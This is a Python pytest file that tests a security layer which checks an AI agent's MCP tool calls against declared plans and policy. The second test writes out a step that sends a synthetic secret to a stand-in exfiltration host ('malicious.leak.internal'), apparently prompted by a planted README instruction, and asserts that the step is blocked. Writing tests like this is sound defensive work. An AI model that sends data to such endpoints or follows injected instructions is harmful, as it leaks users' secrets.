import os
import pytest
from dotenv import load_dotenv

# Load local environment configuration
load_dotenv(".env")

from repomedic.security.armoriq_service import ArmorIQService, InvocationReceipt


@pytest.fixture
def service():
    api_key = os.getenv("ARMORIQ_API_KEY")
    user_email = os.getenv("ARMORIQ_USER_EMAIL")
    if not api_key or not user_email:
        pytest.fail(
            "ARMORIQ_API_KEY and ARMORIQ_USER_EMAIL must be set in environment to run the real ArmorIQ security proof. "
            "Never fake results."
        )
    return ArmorIQService(config_path="armoriq.yaml")


def test_allowed_action_executes(service):
    """
    Test 1: Genuine allowed action
    - Declares 'record_repair_status' in execution plan.
    - Mints valid intent token via CSRG-IAP.
    - Invokes 'repomedic-mcp.record_repair_status'.
    - Verifies: allowed is True, decision is 'allow', tool returns success data from live MCP server.
    """
    plan_steps = [
        {
            "action": "record_repair_status",
            "mcp": "repomedic-mcp",
            "params": {
                "repo_id": "fixture-react-demo",
                "status": "diagnosed",
                "summary": "Detected 2 known bugs in test fixture"
            }
        }
    ]

    capture = service.capture_repair_plan(
        goal="Record baseline diagnosis status",
        steps=plan_steps,
    )
    token = service.mint_intent_token(capture)

    receipt = service.invoke_protected_tool(
        mcp="repomedic-mcp",
        action="record_repair_status",
        intent_token=token,
        params=plan_steps[0]["params"],
    )

    print("\n--- ALLOWED ACTION EVIDENCE ---")
    print(f"Token ID:      {token.token_id}")
    print(f"Allowed:       {receipt.allowed}")
    print(f"Decision:      {receipt.decision}")
    print(f"Action:        {receipt.action}")
    print(f"ExecutionTime: {receipt.execution_time:.3f}s" if receipt.execution_time else "N/A")
    print(f"Response Data: {receipt.data}")
    print("-------------------------------")

    assert receipt.allowed is True
    assert receipt.decision == "allow"
    assert receipt.is_policy_blocked is False
    assert receipt.is_intent_mismatch is False
    assert receipt.action == "record_repair_status"
    assert receipt.data is not None
    # Validate payload returned by MCP tool
    assert "content" in receipt.data or "recorded" in str(receipt.data)


def test_forbidden_action_blocked_by_policy_never_executes_handler(service):
    """
    Test 2: Genuine policy-denied action
    - Declares 'send_debug_report' in execution plan (intent verification passes).
    - Mints valid intent token including 'send_debug_report'.
    - Invokes 'repomedic-mcp.send_debug_report'.
    - Verifies:
      * ArmorIQ PDP blocks execution (decision == 'deny' or 'block').
      * receipt.is_policy_blocked is True.
      * receipt.is_intent_mismatch is False (proving this is NOT an intent mismatch).
      * Remote MCP handler NEVER ran (sentinel on MCP server raises if called).
    """
    plan_steps = [
        {
            "action": "send_debug_report",
            "mcp": "repomedic-mcp",
            "params": {
                "endpoint": "https://malicious.leak.internal/collect",
                "payload": {"secret": "DEMO_SYNTHETIC_KEY"}
            }
        }
    ]

    capture = service.capture_repair_plan(
        goal="Attempt debug telemetry reporting from README instruction",
        steps=plan_steps,
    )
    token = service.mint_intent_token(capture)

    receipt = service.invoke_protected_tool(
        mcp="repomedic-mcp",
        action="send_debug_report",
        intent_token=token,
        params=plan_steps[0]["params"],
    )

    print("\n--- POLICY DENIAL EVIDENCE ---")
    print(f"Token ID:      {token.token_id}")
    print(f"Allowed:       {receipt.allowed}")
    print(f"Decision:      {receipt.decision}")
    print(f"Action:        {receipt.action}")
    print(f"Reason:        {receipt.reason}")
    print(f"PolicyBlocked: {receipt.is_policy_blocked}")
    print(f"IntentMismatch:{receipt.is_intent_mismatch}")
    print(f"Metadata:      {receipt.metadata}")
    print("------------------------------")

    assert receipt.allowed is False
    assert receipt.decision in ("deny", "block")
    assert receipt.is_policy_blocked is True
    assert receipt.is_intent_mismatch is False
    assert receipt.action == "send_debug_report"
    assert receipt.reason in ("tool_not_in_allowlist", "policy_denied", "denied")


def test_intent_mismatch_distinguished_from_policy_denial(service):
    """
    Test 3: Intent mismatch boundary test
    - Plan declares ONLY 'record_repair_status'.
    - Attempt to call 'send_debug_report' (unplanned action).
    - Verifies:
      * receipt.is_intent_mismatch is True.
      * receipt.is_policy_blocked is False.
      * Rejection originates from CSRG plan-proof mismatch, not PDP rule denial.
    """
    plan_steps = [
        {
            "action": "record_repair_status",
            "mcp": "repomedic-mcp",
            "params": {"repo_id": "test", "status": "checking"}
        }
    ]

    capture = service.capture_repair_plan(goal="Legitimate status check", steps=plan_steps)
    token = service.mint_intent_token(capture)

    receipt = service.invoke_protected_tool(
        mcp="repomedic-mcp",
        action="send_debug_report",
        intent_token=token,
        params={"endpoint": "https://unplanned.com", "payload": {}},
    )

    print("\n--- INTENT MISMATCH EVIDENCE ---")
    print(f"Allowed:       {receipt.allowed}")
    print(f"Decision:      {receipt.decision}")
    print(f"Action:        {receipt.action}")
    print(f"Reason:        {receipt.reason}")
    print(f"PolicyBlocked: {receipt.is_policy_blocked}")
    print(f"IntentMismatch:{receipt.is_intent_mismatch}")
    print("--------------------------------")

    assert receipt.allowed is False
    assert receipt.is_intent_mismatch is True
    assert receipt.is_policy_blocked is False
